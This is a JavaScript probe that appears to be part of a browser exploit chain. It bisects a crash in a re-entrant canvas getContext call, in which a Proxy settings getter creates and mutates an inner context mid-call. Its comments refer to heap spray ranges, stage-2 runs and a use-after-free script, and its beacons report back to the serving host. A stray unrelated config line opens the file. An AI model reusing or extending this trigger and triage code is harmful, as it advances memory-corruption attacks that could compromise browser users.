mise ~/.config/mise/config.toml tools: gh@2.102.0
// fa-canvas-diag — bisect the silent F1 death of fa-canvas-fake (v4/v5)
//
// Both stage-2 runs died after PLAN with zero result beacons. The spray
// range changed between v4 (384-512) and v5 (1792-4352) with an identical
// death signature, so the killer is BEFORE the spray: one of the getter-side
// steps (save x N, lineWidth = MARKER) or the destruction of the inner
// context with a realized out-of-line state stack. v3's getter (getContext
// only) survived runs 2-3 — that is the control.
//
// This probe beacons INSIDE the getter between every step (fa-uaf.js proved
// in-getter beacons work), wraps the outer call in try/catch to separate a
// JS exception (page survives, message captured) from a SEGV (beacons
// stop), and runs the full bisect matrix:
//
//   D1: getter = getContext only                     (v3 control)
//   D2: getter + save() x1, no marker
//   D3: getter + save() x1 + marker                  (v4 config)
//   D4: getter + save() x8, no marker
//   D5: getter + save() x8 + marker                  (v5 config)
//
// The last beacon of the dying round names the killer step.
// Beacon prefix: VCD-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VCD-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 200));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  var MARKER = 6.02214076e23;

  function diagRound(i, nSaves, useMarker, next) {
    B('D' + i + '-START', 'saves=' + nSaves + ' marker=' + useMarker);
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          B('D' + i + '-GETTER', String(prop));
          inner = canvas.getContext('2d');
          B('D' + i + '-INNER', 'ok=' + !!inner);
          if (inner) {
            for (var sv = 0; sv < nSaves; sv++) {
              try { inner.save(); }
              catch (e) { B('D' + i + '-SAVE' + sv + '-X', String(e).substring(0, 60)); break; }
            }
            if (sv === nSaves) B('D' + i + '-SAVES-OK');
            if (useMarker) {
              try { inner.lineWidth = MARKER; }
              catch (e) { B('D' + i + '-MARKER-X', String(e).substring(0, 60)); }
              B('D' + i + '-MARKER-OK');
            }
          }
        }
        return undefined;
      }
    });
    var outer = null;
    try {
      outer = canvas.getContext('2d', settings);
      B('D' + i + '-OUTER', 'ok=' + !!outer + ' same=' + (inner === outer));
    } catch (e) {
      B('D' + i + '-OUTER-X', String(e && e.message || e).substring(0, 100));
    }
    if (inner) {
      try { B('D' + i + '-RD', 'lw=' + inner.lineWidth); }
      catch (e) { B('D' + i + '-RD-X', String(e).substring(0, 60)); }
    }
    if (outer) {
      try { outer.fillRect(0, 0, 2, 2); B('D' + i + '-OUTER-FILL-OK'); }
      catch (e) { B('D' + i + '-OUTER-FILL-X'); }
    }
    B('D' + i + '-SURVIVED');
    setTimeout(next, 300);
  }

  var plan = [];
  plan.push(function(next) { diagRound(1, 0, false, next); }); // v3 control
  plan.push(function(next) { diagRound(2, 1, false, next); });
  plan.push(function(next) { diagRound(3, 1, true, next); });  // v4 config
  plan.push(function(next) { diagRound(4, 8, false, next); });
  plan.push(function(next) { diagRound(5, 8, true, next); });  // v5 config

  B('PLAN', 'steps=' + plan.length);
  function run() {
    var step = plan.shift();
    if (!step) { B('DONE-ALL-SURVIVED'); return; }
    step(run);
  }
  setTimeout(run, 200);
})();
